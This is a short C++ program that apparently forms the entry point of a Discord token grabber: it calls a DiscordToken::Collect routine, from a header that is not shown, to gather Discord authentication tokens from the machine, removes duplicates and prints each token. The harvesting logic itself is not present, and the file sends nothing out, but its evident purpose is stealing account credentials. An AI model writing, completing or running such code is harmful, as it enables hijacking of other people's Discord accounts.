#include "utils/utils.hpp"
#include "DiscordToken.hpp"

int main()
{
    std::vector<std::string> token_list;
    DiscordToken::Collect(token_list);

    utils::vector::remove_duplicates(token_list);

    for (const std::string &token : token_list) {

        std::cout << "--------------------\n";
        std::cout << "Token: " << token << "\n";
        std::cout << "\n--------------------\n\n";
    }
}
